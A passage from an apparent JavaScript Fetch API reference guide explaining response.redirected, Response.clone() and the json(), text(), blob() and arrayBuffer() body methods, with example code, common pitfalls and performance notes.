    if (originalDomain !== finalDomain) {
      console.warn('Cross-domain redirect detected');
      console.warn(`From: ${originalDomain}`);
      console.warn(`To: ${finalDomain}`);
    }
  }
  
  return response;
}
```

#### Logging and Analytics

Track redirect behavior for monitoring purposes:

```javascript
async function fetchWithLogging(url) {
  const startTime = performance.now();
  const response = await fetch(url);
  const endTime = performance.now();
  
  const logEntry = {
    originalUrl: url,
    finalUrl: response.url,
    wasRedirected: response.redirected,
    status: response.status,
    duration: endTime - startTime
  };
  
  if (response.redirected) {
    console.log('Redirect occurred:', logEntry);
  }
  
  return response;
}
```

#### Conditional Processing

Handle redirected responses differently:

```javascript
async function fetchResource(url) {
  const response = await fetch(url);
  
  if (response.redirected) {
    // Handle redirected response
    console.log('Resource moved to:', response.url);
    // Potentially update cached URLs, notify user, etc.
  }
  
  return await response.json();
}
```

### Interaction with Redirect Modes

The `redirect` option in fetch controls redirect behavior:

```javascript
// Default: follow redirects automatically
fetch(url, { redirect: 'follow' });

// Error on redirect
fetch(url, { redirect: 'error' })
  .catch(err => console.log('Redirect blocked'));

// Manual mode: get redirect response without following
fetch(url, { redirect: 'manual' });
```

**Important**: When using `redirect: 'manual'`, the response object will have `type: 'opaqueredirect'` and `redirected` will be `false` because the redirect wasn't actually followed.

### Redirect Chains

The property only indicates whether _any_ redirect occurred, not how many:

```javascript
// URL chain: /a → /b → /c → /d
const response = await fetch('/a');
console.log(response.redirected); // true
console.log(response.url); // '/d' (final destination)
```

[Inference] The browser follows the entire redirect chain internally, but the Fetch API doesn't expose intermediate URLs in the chain—only the final destination is accessible via `response.url`.

### CORS Considerations

Cross-origin redirects have additional constraints:

```javascript
// Request to domain A redirects to domain B
const response = await fetch('https://domain-a.com/resource');

if (response.redirected) {
  // Both domain A and domain B must have proper CORS headers
  // Otherwise, the fetch will fail
}
```

The redirect chain must maintain CORS compliance at each step. If any intermediate server doesn't provide appropriate CORS headers, the entire request fails.

### Distinguishing from Manual Redirects

Compare automatic redirects with manual client-side navigation:

```javascript
async function handlePotentialRedirect(url) {
  const response = await fetch(url);
  
  if (response.redirected) {
    // Automatic HTTP redirect occurred
    console.log('HTTP redirect to:', response.url);
  } else if (response.status === 200 && 
             response.headers.get('content-type')?.includes('text/html')) {
    const html = await response.text();
    // Check for meta refresh or JavaScript redirects
    if (html.includes('<meta http-equiv="refresh"')) {
      console.log('Meta refresh detected (not HTTP redirect)');
      // response.redirected would be false
    }
  }
}
```

### Browser Support

The `redirected` property is widely supported across modern browsers. [Unverified] All browsers that support the Fetch API include support for the `redirected` property.

### Performance Implications

[Inference] Each redirect adds network latency:

```javascript
async function measureRedirectImpact(url) {
  const start = performance.now();
  const response = await fetch(url);
  const duration = performance.now() - start;
  
  if (response.redirected) {
    console.log(`Request with redirect took: ${duration}ms`);
    // Each redirect typically adds 100-500ms depending on server location
  }
}
```

### Debugging Redirects

Combine with other Response properties for comprehensive debugging:

```javascript
async function debugFetch(url) {
  try {
    const response = await fetch(url);
    
    console.log('Debug Info:', {
      originalUrl: url,
      finalUrl: response.url,
      redirected: response.redirected,
      status: response.status,
      statusText: response.statusText,
      type: response.type,
      headers: Object.fromEntries(response.headers.entries())
    });
    
    return response;
  } catch (error) {
    console.error('Fetch failed:', error);
    throw error;
  }
}
```

### Common Pitfalls

#### Assuming Single Redirect

```javascript
// ❌ Incorrect assumption
if (response.redirected) {
  console.log('One redirect occurred');
  // Could have been multiple redirects in chain
}

// ✓ Correct interpretation
if (response.redirected) {
  console.log('At least one redirect occurred');
  console.log('Final destination:', response.url);
}
```

#### Checking Status Instead of redirected

```javascript
// ❌ Won't work - status is from final response
if (response.status === 301 || response.status === 302) {
  console.log('Redirected'); // Never true with redirect: 'follow'
}

// ✓ Correct way
if (response.redirected) {
  console.log('Redirected to:', response.url);
}
```

#### Ignoring Manual Mode Behavior

```javascript
// With redirect: 'manual', redirected is always false
const response = await fetch(url, { redirect: 'manual' });
console.log(response.redirected); // Always false
console.log(response.type); // 'opaqueredirect' if redirect occurred
```

### Comparison with XMLHttpRequest

Unlike XMLHttpRequest, which doesn't expose redirect information easily, Fetch provides this property explicitly:

```javascript
// Fetch API - straightforward
const response = await fetch(url);
if (response.redirected) {
  console.log('Redirected to:', response.url);
}

// XMLHttpRequest - [Inference] requires monitoring responseURL changes
const xhr = new XMLHttpRequest();
xhr.open('GET', url);
xhr.onload = function() {
  if (xhr.responseURL !== url) {
    console.log('Likely redirected to:', xhr.responseURL);
  }
};
xhr.send();
```

---

## Response Cloning

### Why Response Bodies Can Only Be Read Once

Response objects in the Fetch API contain a `ReadableStream` for the body, which can only be consumed once. After calling methods like `.json()`, `.text()`, `.blob()`, or `.arrayBuffer()`, the stream is locked and drained. Attempting to read it again throws a `TypeError: body stream already read`.

```javascript
const response = await fetch('/api/data');
const data1 = await response.json(); // Works
const data2 = await response.json(); // TypeError: body stream already read
```

The `bodyUsed` property indicates whether the body has been consumed:

```javascript
console.log(response.bodyUsed); // true after reading
```

### The `clone()` Method

`Response.clone()` creates an independent copy of the Response object with its own body stream. Both the original and cloned responses can be read separately.

```javascript
const response = await fetch('/api/data');
const clone = response.clone();

const data1 = await response.json();
const data2 = await clone.json(); // Works independently
```

### Technical Behavior

**Stream Duplication**: `clone()` creates a new `ReadableStream` that tees from the original, allowing parallel consumption without interference.

**Property Copying**: Headers, status, statusText, URL, and other metadata are copied to the clone. Both responses share the same values but are independent objects.

**Immutability Preservation**: Responses are immutable. Cloning maintains this—modifying headers on one doesn't affect the other.

### Common Use Cases

**Caching Responses**:

```javascript
async function fetchWithCache(url) {
  const response = await fetch(url);
  const clone = response.clone();
  
  // Store in cache
  caches.open('my-cache').then(cache => {
    cache.put(url, clone);
  });
  
  // Return original for immediate use
  return response.json();
}
```

**Multiple Consumers**:

```javascript
const response = await fetch('/api/data');

// Send to different processors
processJSON(response.clone());
logResponse(response.clone());
storeBackup(response.clone());
```

**Conditional Processing**:

```javascript
const response = await fetch('/api/data');
const clone = response.clone();

if (response.ok) {
  return response.json();
} else {
  const errorText = await clone.text();
  console.error('Error response:', errorText);
}
```

### Timing Constraints

Cloning must occur **before** reading the body:

```javascript
const response = await fetch('/api/data');
await response.json(); // Body consumed

const clone = response.clone(); // TypeError: body stream is locked
```

### Performance Considerations

**Memory Overhead**: Each clone maintains its own buffer. Cloning large responses (images, videos, large JSON) duplicates memory usage.

**Stream Teeing Cost**: The underlying implementation uses stream teeing, which has computational overhead. Multiple clones of the same response multiply this cost.

**Best Practice**: Only clone when necessary. If you need the same data in multiple places, read once and pass the parsed result.

```javascript
// Less efficient
const r1 = response.clone();
const r2 = response.clone();
const data1 = await r1.json();
const data2 = await r2.json();

// More efficient
const data = await response.json();
processData(data);
storeData(data);
```

### Cloning with Service Workers

Service workers commonly clone responses to both serve and cache:

```javascript
self.addEventListener('fetch', event => {
  event.respondWith(
    fetch(event.request).then(response => {
      const clone = response.clone();
      
      caches.open('v1').then(cache => {
        cache.put(event.request, clone);
      });
      
      return response;
    })
  );
});
```

### Error Handling

**Network Errors**: If the original fetch fails, cloning the response doesn't change the error state.

**Body Errors**: If reading the body fails (corrupted data, network interruption), both original and clone will fail when attempting to read.

```javascript
try {
  const response = await fetch('/api/data');
  const clone = response.clone();
  
  const data = await response.json();
} catch (error) {
  // Clone still available if error occurred during json() parsing
  const text = await clone.text();
  console.error('Raw response:', text);
}
```

### Limitations

**Already-Read Bodies**: Cannot clone after the body has been consumed.

**Locked Streams**: Cannot clone if the body stream is locked by another reader.

**Opaque Responses**: Can clone opaque responses (no-cors mode), but cannot read their bodies regardless.

```javascript
const response = await fetch('https://external-api.com', { mode: 'no-cors' });
const clone = response.clone(); // Works
await clone.text(); // Returns empty string for opaque responses
```

### Multiple Cloning

You can clone a response multiple times, each creating an independent copy:

```javascript
const response = await fetch('/api/data');
const clone1 = response.clone();
const clone2 = response.clone();
const clone3 = clone1.clone(); // Can clone a clone

// All can be read independently
const data1 = await response.json();
const data2 = await clone1.json();
const data3 = await clone2.json();
const data4 = await clone3.json();
```

### Integration with Response Constructor

Cloned responses behave identically to original responses when passed to `new Response()`:

```javascript
const original = await fetch('/api/data');
const clone = original.clone();

const manualResponse = new Response(clone.body, {
  status: clone.status,
  headers: clone.headers
});
```

---

# Response Body Methods

## response.json()

### What It Does

`response.json()` is a method that reads the response stream from a fetch request and parses it as JSON. It returns a Promise that resolves to a JavaScript object representing the parsed JSON data.

### Return Value

Returns a `Promise` that resolves to the result of parsing the response body text as JSON. This can be any valid JSON type: object, array, string, number, boolean, or null.

### Basic Usage

```javascript
fetch('https://api.example.com/data')
  .then(response => response.json())
  .then(data => {
    console.log(data); // JavaScript object/array
  });
```

With async/await:

```javascript
const response = await fetch('https://api.example.com/data');
const data = await response.json();
console.log(data);
```

### Body Stream Consumption

`response.json()` consumes the response body stream completely. After calling it:

- The body stream is **locked** and cannot be read again
- You cannot call `response.text()`, `response.blob()`, or any other body method
- You cannot call `response.json()` again on the same response

```javascript
const response = await fetch('https://api.example.com/data');
const data1 = await response.json();
const data2 = await response.json(); // TypeError: body stream already read
```

### Error Handling

The method can reject for multiple reasons:

**JSON Parsing Errors:**

```javascript
try {
  const response = await fetch('https://api.example.com/data');
  const data = await response.json(); // Throws if response isn't valid JSON
} catch (error) {
  console.error('JSON parsing failed:', error);
}
```

**Network Errors:**

```javascript
try {
  const response = await fetch('https://api.example.com/data');
  const data = await response.json();
} catch (error) {
  console.error('Fetch or parsing failed:', error);
}
```

### HTTP Status Checking

`response.json()` will attempt to parse JSON **regardless of HTTP status code**. It doesn't automatically throw on 4xx or 5xx responses:

```javascript
const response = await fetch('https://api.example.com/data');

if (!response.ok) {
  // Handle HTTP errors before parsing
  throw new Error(`HTTP error! status: ${response.status}`);
}

const data = await response.json();
```

Common pattern:

```javascript
const response = await fetch('https://api.example.com/data');

if (!response.ok) {
  const errorData = await response.json(); // Error responses often contain JSON
  throw new Error(errorData.message || 'Request failed');
}

const data = await response.json();
```

### Content-Type Considerations

`response.json()` doesn't validate the `Content-Type` header. It will attempt to parse any response body as JSON:

```javascript
// Works even if server sends text/html or other Content-Type
const response = await fetch('https://api.example.com/data');
const data = await response.json(); // Attempts parsing regardless
```

[Inference] Best practice is to check `Content-Type` before parsing if you need strict validation:

```javascript
const response = await fetch('https://api.example.com/data');
const contentType = response.headers.get('content-type');

if (!contentType || !contentType.includes('application/json')) {
  throw new TypeError("Response wasn't JSON");
}

const data = await response.json();
```

### Empty Responses

Calling `response.json()` on an empty response body throws a `SyntaxError`:

```javascript
// Response with empty body
const response = await fetch('https://api.example.com/delete/123'); // 204 No Content
const data = await response.json(); // SyntaxError: Unexpected end of JSON input
```

Handle empty responses:

```javascript
const response = await fetch('https://api.example.com/data');

if (response.status === 204 || response.headers.get('content-length') === '0') {
  return null; // Or handle accordingly
}

const data = await response.json();
```

### Cloning Responses

To read the body multiple times, clone the response first:

```javascript
const response = await fetch('https://api.example.com/data');
const clone = response.clone();

const data1 = await response.json();
const data2 = await clone.json(); // Works because we cloned
```

### Performance Considerations

`response.json()` must:

1. Read the entire response body into memory
2. Parse the complete text as JSON

For large JSON responses, this can be memory-intensive. The parsing is synchronous once the data is received.

### Relationship to Other Body Methods

The Response interface provides several body reading methods, but only one can be called per response:

- `response.json()` - Parse as JSON
- `response.text()` - Get as string
- `response.blob()` - Get as Blob
- `response.arrayBuffer()` - Get as ArrayBuffer
- `response.formData()` - Parse as FormData

### TypeScript Typing

In TypeScript, you can type the resolved value:

```typescript
interface User {
  id: number;
  name: string;
  email: string;
}

const response = await fetch('https://api.example.com/user/1');
const user: User = await response.json();
```

[Inference] The generic typing doesn't provide runtime validation - `response.json()` always returns `Promise<any>` at runtime.

### Common Patterns

**Complete error handling:**

```javascript
async function fetchJSON(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    const data = await response.json();
    return data;
    
  } catch (error) {
    if (error instanceof SyntaxError) {
      console.error('Invalid JSON:', error);
    } else {
      console.error('Fetch error:', error);
    }
    throw error;
  }
}
```

**Checking for JSON before parsing:**

```javascript
async function safeJSONParse(response) {
  const text = await response.text();
  
  if (!text) {
    return null;
  }
  
  try {
    return JSON.parse(text);
  } catch (error) {
    console.error('JSON parse error:', error);
    throw error;
  }
}
```

### Browser Compatibility

`response.json()` is part of the Fetch API standard and is supported in all modern browsers. It's also available in Node.js 18+ and Deno.

---

## response.text()

### Method Signature

```javascript
response.text(): Promise<string>
```

Returns a promise that resolves with the response body as a UTF-8 decoded string. This method reads the entire response stream to completion.

### Basic Usage

```javascript
fetch('https://api.example.com/data')
  .then(response => response.text())
  .then(text => {
    console.log(text);
  })
  .catch(error => {
    console.error('Error:', error);
  });
```

With async/await:

```javascript
async function fetchData() {
  try {
    const response = await fetch('https://api.example.com/data');
    const text = await response.text();
    console.log(text);
  } catch (error) {
    console.error('Error:', error);
  }
}
```

### Body Stream Consumption

Once `response.text()` is called, the body stream is locked and consumed. You cannot call any other body reading method afterward on the same response.

```javascript
const response = await fetch('https://api.example.com/data');
const text = await response.text();

// This will throw an error - body already consumed
const json = await response.json(); // TypeError: Failed to execute 'json'
```

### Checking Body Consumption Status

```javascript
const response = await fetch('https://api.example.com/data');

console.log(response.bodyUsed); // false

const text = await response.text();

console.log(response.bodyUsed); // true
```

### Common Use Cases

#### HTML Content

```javascript
async function loadHTML() {
  const response = await fetch('/page.html');
  const html = await response.text();
  document.getElementById('content').innerHTML = html;
}
```

#### Plain Text Files

```javascript
async function loadTextFile() {
  const response = await fetch('/data.txt');
  const text = await response.text();
  return text.split('\n');
}
```

#### CSV Data

```javascript
async function loadCSV() {
  const response = await fetch('/data.csv');
  const csvText = await response.text();
  
  const rows = csvText.split('\n');
  const data = rows.map(row => row.split(','));
  
  return data;
}
```

#### XML/SVG Content

```javascript
async function loadSVG() {
  const response = await fetch('/icon.svg');
  const svgText = await response.text();
  
  const parser = new DOMParser();
  const svgDoc = parser.parseFromString(svgText, 'image/svg+xml');
  
  return svgDoc;
}
```

### Error Handling Patterns

#### Response Status Validation

```javascript
async function fetchWithValidation(url) {
  const response = await fetch(url);
  
  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`HTTP ${response.status}: ${errorText}`);
  }
  
  return await response.text();
}
```

#### Network Error Handling

```javascript
async function safeFetch(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      throw new Error(`HTTP error: ${response.status}`);
    }
    
    const text = await response.text();
    return { success: true, data: text };
    
  } catch (error) {
    if (error instanceof TypeError) {
      return { success: false, error: 'Network error or CORS issue' };
    }
    return { success: false, error: error.message };
  }
}
```

### Converting Text to Other Formats

#### Manual JSON Parsing

```javascript
const response = await fetch('https://api.example.com/data');
const text = await response.text();

try {
  const data = JSON.parse(text);
  console.log(data);
} catch (error) {
  console.error('Invalid JSON:', text);
}
```

#### Base64 Encoding

```javascript
async function textToBase64(url) {
  const response = await fetch(url);
  const text = await response.text();
  return btoa(text);
}
```

### Character Encoding

The `text()` method always decodes the body as UTF-8. If you need different encoding, use `arrayBuffer()` or `blob()` with TextDecoder.

```javascript
async function fetchWithEncoding(url, encoding = 'utf-8') {
  const response = await fetch(url);
  const buffer = await response.arrayBuffer();
  
  const decoder = new TextDecoder(encoding);
  return decoder.decode(buffer);
}

// Usage
const latin1Text = await fetchWithEncoding('/data.txt', 'iso-8859-1');
```

### Response Cloning for Multiple Reads

To read the response body multiple times or with different methods, clone the response first.

```javascript
const response = await fetch('https://api.example.com/data');

// Clone before consuming
const clonedResponse = response.clone();

// Now you can use both
const text = await response.text();
const json = await clonedResponse.json();

console.log('Text:', text);
console.log('JSON:', json);
```

### Streaming Large Text Responses

For very large responses, consider streaming instead of loading everything into memory at once.

```javascript
async function streamText(url) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  let result = '';
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) break;
    
    const chunk = decoder.decode(value, { stream: true });
    result += chunk;
    
    // Process chunk immediately if needed
    console.log('Received chunk:', chunk.length, 'bytes');
  }
  
  return result;
}
```

### Performance Considerations

**Memory Usage:** The entire response is loaded into memory as a string. For large files, this can be significant.

```javascript
// This loads entire file into memory
const response = await fetch('/large-file.txt');
const text = await response.text(); // Could be hundreds of MB

// Better approach for large files
const response = await fetch('/large-file.txt');
const reader = response.body.getReader();
// Process in chunks
```

**Decoding Cost:** UTF-8 decoding happens synchronously and can block the main thread for very large responses.

### Comparison with Other Body Methods

| Method | Return Type | Use Case |
|--------|-------------|----------|
| `text()` | Promise\<string\> | Plain text, HTML, CSV, XML |
| `json()` | Promise\<any\> | JSON data (automatic parsing) |
| `blob()` | Promise\<Blob\> | Binary data, files, images |
| `arrayBuffer()` | Promise\<ArrayBuffer\> | Raw binary, custom encoding |
| `formData()` | Promise\<FormData\> | Multipart form data |

### Common Pitfalls

#### Reading Body Twice

```javascript
// ❌ Wrong - body can only be read once
const response = await fetch(url);
const text1 = await response.text();
const text2 = await response.text(); // Error!

// ✅ Correct - store the result
const response = await fetch(url);
const text = await response.text();
const copy = text; // Use the stored string
```

#### Not Handling Empty Responses

```javascript
// ❌ Assumes response always has content
const response = await fetch(url);
const text = await response.text();
const firstLine = text.split('\n')[0]; // Could fail if empty

// ✅ Handle empty responses
const response = await fetch(url);
const text = await response.text();
if (text.trim()) {
  const firstLine = text.split('\n')[0];
}
```

#### Ignoring Content Type

```javascript
// ❌ Using text() for everything
const response = await fetch(url);
const text = await response.text();
const data = JSON.parse(text); // Inefficient

// ✅ Use appropriate method
const response = await fetch(url);
const contentType = response.headers.get('content-type');

if (contentType?.includes('application/json')) {
  const data = await response.json();
} else {
  const text = await response.text();
}
```

### Browser Compatibility

The `text()` method is part of the Fetch API standard and is supported in all modern browsers. For older browser support, consider using a polyfill.

Supported in Chrome 42+, Firefox 39+, Safari 10.1+, Edge 14+, and all modern mobile browsers.

### Testing Strategies

```javascript
// Mock fetch for testing
global.fetch = jest.fn(() =>
  Promise.resolve({
    ok: true,
    text: () => Promise.resolve('mocked text response')
  })
);

test('fetches text data', async () => {
  const result = await fetchData();
  expect(result).toBe('mocked text response');
  expect(fetch).toHaveBeenCalledWith(expectedUrl);
});
```

### Best Practices Summary

1. Always validate response status before reading body
2. Store the text result if you need to use it multiple times
3. Use appropriate body method based on content type
4. Consider streaming for very large responses
5. Handle errors and empty responses gracefully
6. Clone response if you need multiple body readings

---

## response.blob()

The `response.blob()` method returns a promise that resolves with a `Blob` object representing the response body. This method is specifically designed for handling binary data returned from fetch requests.

### Method Signature

```javascript
response.blob()
```

**Returns:** A `Promise` that resolves to a `Blob` object.

### When to Use response.blob()

Use `response.blob()` when you need to work with binary data such as:

- Images (JPEG, PNG, GIF, WebP, SVG)
- PDFs and other documents
- Audio files (MP3, WAV, OGG)
- Video files (MP4, WebM)
- Archive files (ZIP, RAR)
- Any other binary file format

### Basic Usage Pattern

```javascript
fetch('https://example.com/image.jpg')
  .then(response => response.blob())
  .then(blob => {
    // Work with the blob
    console.log(blob.size); // File size in bytes
    console.log(blob.type); // MIME type
  })
  .catch(error => console.error('Error:', error));
```

### Blob Object Properties

Once you have the Blob object, you can access:

- **`blob.size`**: The size of the blob in bytes
- **`blob.type`**: The MIME type of the blob (e.g., "image/jpeg", "application/pdf")

### Common Use Cases

#### Displaying Images

```javascript
async function loadAndDisplayImage(url) {
  const response = await fetch(url);
  const blob = await response.blob();
  
  // Create object URL
  const objectURL = URL.createObjectURL(blob);
  
  // Use in img element
  const img = document.createElement('img');
  img.src = objectURL;
  document.body.appendChild(img);
  
  // Clean up when done
  img.onload = () => URL.revokeObjectURL(objectURL);
}
```

#### Downloading Files

```javascript
async function downloadFile(url, filename) {
  const response = await fetch(url);
  const blob = await response.blob();
  
  // Create download link
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = filename;
  link.click();
  
  // Clean up
  URL.revokeObjectURL(link.href);
}
```

#### Uploading to Server

```javascript
async function uploadImage(imageUrl) {
  // Fetch the image as blob
  const response = await fetch(imageUrl);
  const blob = await response.blob();
  
  // Upload to server
  const formData = new FormData();
  formData.append('file', blob, 'image.jpg');
  
  await fetch('/upload', {
    method: 'POST',
    body: formData
  });
}
```

#### Converting to Base64

```javascript
async function blobToBase64(url) {
  const response = await fetch(url);
  const blob = await response.blob();
  
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onloadend = () => resolve(reader.result);
    reader.onerror = reject;
    reader.readAsDataURL(blob);
  });
}

// Usage
const base64 = await blobToBase64('https://example.com/image.jpg');
console.log(base64); // "data:image/jpeg;base64,/9j/4AAQ..."
```

#### Reading Blob Content as Text

```javascript
async function blobToText(url) {
  const response = await fetch(url);
  const blob = await response.blob();
  return await blob.text();
}
```

#### Creating Blob URLs for Media Players

```javascript
async function loadVideo(url) {
  const response = await fetch(url);
  const blob = await response.blob();
  
  const video = document.querySelector('video');
  video.src = URL.createObjectURL(blob);
  video.play();
}
```

### Memory Management and Object URLs

When using `URL.createObjectURL()`, always revoke the URL when finished to prevent memory leaks:

```javascript
const objectURL = URL.createObjectURL(blob);

// Use the URL...

// Clean up when done
URL.revokeObjectURL(objectURL);
```

**Best practices:**

- Revoke URLs after the resource has loaded
- Revoke URLs when the component/element is destroyed
- Use the `onload` event for images to ensure the resource is ready before revoking

### Error Handling

Always check the response status before calling `blob()`:

```javascript
async function fetchBlob(url) {
  const response = await fetch(url);
  
  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }
  
  const contentType = response.headers.get('content-type');
  if (!contentType || !contentType.includes('image')) {
    throw new Error('Response is not an image');
  }
  
  return await response.blob();
}
```

### Body Consumed State

Important: Once you call `response.blob()`, the response body is consumed and cannot be read again:

```javascript
const response = await fetch(url);
const blob1 = await response.blob(); // Works

// This will throw an error
const blob2 = await response.blob(); // Error: body already read
```

To use the response multiple times, clone it first:

```javascript
const response = await fetch(url);
const clonedResponse = response.clone();

const blob1 = await response.blob();
const blob2 = await clonedResponse.blob();
```

### Blob Slicing

You can extract portions of a blob using the `slice()` method:

```javascript
const response = await fetch('large-file.bin');
const blob = await response.blob();

// Extract first 1MB
const chunk = blob.slice(0, 1024 * 1024);
console.log(chunk.size); // 1048576 bytes
```

### Converting Between Response Methods

While `response.blob()` is for binary data, you can convert between formats:

```javascript
// Blob to ArrayBuffer
const response = await fetch(url);
const blob = await response.blob();
const arrayBuffer = await blob.arrayBuffer();

// Blob to text (for text files fetched as blob)
const text = await blob.text();

// Blob to JSON (if the blob contains JSON)
const json = JSON.parse(await blob.text());
```

### Browser Compatibility

The `response.blob()` method is widely supported in all modern browsers. However, for older browsers, consider checking:

```javascript
if ('blob' in Response.prototype) {
  // blob() is supported
} else {
  // Fallback required
}
```

### Performance Considerations

- **Streaming**: For very large files, consider using streams instead of loading the entire blob into memory
- **Memory usage**: Blobs are stored in memory, so be mindful of loading multiple large files
- **Caching**: Use appropriate cache headers to avoid re-downloading the same resources

### Working with Streams (Advanced)

For large files, you might want to process the response as a stream instead:

```javascript
async function downloadLargeFile(url) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  
  const chunks = [];
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    chunks.push(value);
  }
  
  // Combine chunks into blob
  const blob = new Blob(chunks);
  return blob;
}
```

### MIME Type Handling

The blob's MIME type is determined by the `Content-Type` header:

```javascript
const response = await fetch(url);
const blob = await response.blob();

console.log(blob.type); // e.g., "image/jpeg"

// Override MIME type if needed
const newBlob = blob.slice(0, blob.size, 'image/png');
console.log(newBlob.type); // "image/png"
```

### Creating New Blobs from Response Data

```javascript
async function modifyImage(url) {
  const response = await fetch(url);
  const blob = await response.blob();
  
  // Create a new blob with modified type
  const modifiedBlob = new Blob([blob], { 
    type: 'image/png' 
  });
  
  return modifiedBlob;
}
```

### Practical Example: Image Gallery with Lazy Loading

```javascript
class ImageGallery {
  constructor() {
    this.cache = new Map();
  }
  
  async loadImage(url) {
    // Check cache first
    if (this.cache.has(url)) {
      return this.cache.get(url);
    }
    
    // Fetch and cache
    const response = await fetch(url);
    if (!response.ok) {
      throw new Error(`Failed to load: ${url}`);
    }
    
    const blob = await response.blob();
    const objectURL = URL.createObjectURL(blob);
    
    this.cache.set(url, objectURL);
    return objectURL;
  }
  
  clearCache() {
    // Revoke all object URLs
    for (const url of this.cache.values()) {
      URL.revokeObjectURL(url);
    }
    this.cache.clear();
  }
}

// Usage
const gallery = new ImageGallery();
const imageUrl = await gallery.loadImage('photo.jpg');
document.querySelector('img').src = imageUrl;
```

### Security Considerations

- **CORS**: Ensure proper CORS headers are set for cross-origin blob requests
- **Content validation**: Always validate the content type before using blobs
- **Size limits**: Implement size checks to prevent memory exhaustion
- **Sanitization**: Be cautious with user-uploaded content that's fetched as blobs

```javascript
async function safeBlobFetch(url, maxSize = 10 * 1024 * 1024) {
  const response = await fetch(url);
  
  // Check content length
  const contentLength = response.headers.get('content-length');
  if (contentLength && parseInt(contentLength) > maxSize) {
    throw new Error('File too large');
  }
  
  // Validate content type
  const contentType = response.headers.get('content-type');
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
  if (!allowedTypes.includes(contentType)) {
    throw new Error('Invalid content type');
  }
  
  return await response.blob();
}
```

---

## response.arrayBuffer()

The `arrayBuffer()` method reads the response stream to completion and returns a promise that resolves with an `ArrayBuffer` containing the raw binary data of the response body.

### Method Signature

```javascript
arrayBuffer(): Promise<ArrayBuffer>
```

### Return Value

A Promise that resolves to an `ArrayBuffer` containing the complete response body as raw binary data. The ArrayBuffer represents a fixed-length raw binary data buffer.

### Key Characteristics

#### Single-Use Consumption

The response body can only be read once. After calling `arrayBuffer()`, the body is consumed and subsequent calls to any body reading methods (`json()`, `text()`, `blob()`, `arrayBuffer()`, `formData()`) will reject with a TypeError.

```javascript
const response = await fetch('https://example.com/data.bin');
const buffer1 = await response.arrayBuffer(); // Works
const buffer2 = await response.arrayBuffer(); // TypeError: body already consumed
```

#### Stream Exhaustion

The method reads the entire response stream before resolving. For large files, this means the entire content is loaded into memory before the promise resolves.

#### Body Properties

After consumption:

- `response.bodyUsed` becomes `true`
- `response.body` (ReadableStream) is locked and cannot be read again

### Working with ArrayBuffer

#### Creating Typed Arrays

ArrayBuffer itself doesn't provide direct access to bytes. Use typed array views to manipulate the data:

```javascript
const response = await fetch('https://example.com/binary-data');
const buffer = await response.arrayBuffer();

// View as 8-bit unsigned integers
const uint8View = new Uint8Array(buffer);

// View as 16-bit unsigned integers
const uint16View = new Uint16Array(buffer);

// View as 32-bit floating point numbers
const float32View = new Float32Array(buffer);
```

#### DataView for Mixed Data Types

When binary data contains multiple data types, use DataView for flexible reading:

```javascript
const response = await fetch('https://example.com/mixed-binary');
const buffer = await response.arrayBuffer();
const view = new DataView(buffer);

// Read different types at specific offsets
const int32 = view.getInt32(0, true); // offset 0, little-endian
const float64 = view.getFloat64(4, true); // offset 4
const uint8 = view.getUint8(12); // offset 12
```

### Common Use Cases

#### Image Processing

```javascript
const response = await fetch('https://example.com/image.png');
const buffer = await response.arrayBuffer();
const blob = new Blob([buffer], { type: 'image/png' });
const imageUrl = URL.createObjectURL(blob);
```

#### Binary File Downloads

```javascript
async function downloadBinaryFile(url, filename) {
  const response = await fetch(url);
  const buffer = await response.arrayBuffer();
  const blob = new Blob([buffer]);
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = filename;
  link.click();
}
```

#### WebAssembly Module Loading

```javascript
const response = await fetch('module.wasm');
const buffer = await response.arrayBuffer();
const module = await WebAssembly.compile(buffer);
const instance = await WebAssembly.instantiate(module);
```

#### Audio Processing with Web Audio API

```javascript
const response = await fetch('audio.mp3');
const buffer = await response.arrayBuffer();
const audioContext = new AudioContext();
const audioBuffer = await audioContext.decodeAudioData(buffer);
```

#### Cryptographic Operations

```javascript
const response = await fetch('data.bin');
const buffer = await response.arrayBuffer();
const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
const hashArray = Array.from(new Uint8Array(hashBuffer));
const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
```

### Binary Data Manipulation

#### Checking File Signatures (Magic Numbers)

```javascript
const response = await fetch('file.bin');
const buffer = await response.arrayBuffer();
const bytes = new Uint8Array(buffer);

// Check PNG signature
if (bytes[0] === 0x89 && bytes[1] === 0x50 && 
    bytes[2] === 0x4E && bytes[3] === 0x47) {
  console.log('This is a PNG file');
}
```

#### Byte Slicing

```javascript
const response = await fetch('large-file.bin');
const buffer = await response.arrayBuffer();

// Extract a portion of the buffer
const slice = buffer.slice(100, 200); // bytes 100-199
const sliceView = new Uint8Array(slice);
```

#### Concatenating Buffers

```javascript
function concatenateArrayBuffers(buffer1, buffer2) {
  const tmp = new Uint8Array(buffer1.byteLength + buffer2.byteLength);
  tmp.set(new Uint8Array(buffer1), 0);
  tmp.set(new Uint8Array(buffer2), buffer1.byteLength);
  return tmp.buffer;
}
```

### Memory Considerations

#### Size Limits

ArrayBuffers are constrained by available memory. [Inference: Based on JavaScript engine implementations] Very large responses may cause memory issues or errors. Consider streaming approaches for large files.

#### Memory Management

```javascript
// For large buffers, nullify references when done
let buffer = await response.arrayBuffer();
// ... use buffer ...
buffer = null; // Allow garbage collection
```

### Error Handling

#### Network Errors

```javascript
try {
  const response = await fetch('https://example.com/data.bin');
  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }
  const buffer = await response.arrayBuffer();
} catch (error) {
  console.error('Failed to fetch or parse:', error);
}
```

#### Body Already Consumed

```javascript
const response = await fetch('https://example.com/data.bin');

if (response.bodyUsed) {
  console.error('Body already consumed');
} else {
